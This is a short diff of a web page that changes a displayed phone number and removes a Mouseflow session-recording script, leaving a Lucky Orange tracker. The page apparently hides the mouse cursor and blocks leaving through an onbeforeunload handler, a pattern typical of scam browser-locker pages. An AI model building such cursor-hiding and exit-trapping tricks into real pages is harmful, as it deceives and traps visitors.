@@ -76,20 +76,10 @@ function logAndAbort($reason, $referrer, $log_file) {
     </script>
 
     <script type="text/javascript">
-      var phone_number = '0101-84453-02844';
+      var phone_number = '0101 84453-02844';
     </script>
 
 <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=d0a77be2"></script>
-<script type="text/javascript">
-  window._mfq = window._mfq || [];
-  (function() {
-    var mf = document.createElement("script");
-    mf.type = "text/javascript"; mf.defer = true;
-    mf.src = "//cdn.mouseflow.com/projects/6aef46cb-63d1-4688-89cb-9f96f940804c.js";
-    document.getElementsByTagName("head")[0].appendChild(mf);
-  })();
-</script>
-
   </head>
   <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
 
